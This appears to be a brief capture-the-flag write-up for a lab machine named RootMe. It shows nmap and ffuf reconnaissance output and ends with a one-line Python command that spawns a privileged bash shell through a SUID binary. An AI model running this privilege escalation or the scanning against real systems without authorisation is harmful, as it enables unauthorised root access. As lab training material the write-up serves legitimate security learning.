# RootMe

#Linux #PHP #PrivEsc #WebExploitation 

## Reconnaissance

```
$ nmap -sV -sC 10.67.178.184
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-01 05:33 -0500
Nmap scan report for 10.67.178.184
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:4c:13:02:a7:e6:a1:48:8f:6b:4a:01:11:a6:9e:55 (RSA)
|   256 06:27:db:1c:93:1a:18:f9:2e:00:01:d9:0f:37:55:90 (ECDSA)
|_  256 74:db:eb:fa:e0:78:df:9a:db:e9:12:fd:87:89:7a:4e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds
```


```
$ ffuf -u http://10.67.178.184/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.67.178.184/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css               [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 133ms]
uploads           [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 133ms]
panel             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 132ms]
js                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 139ms]
```




```
python2.7 -c 'import os; os.execl("/bin/bash", "sh", "-p")'
```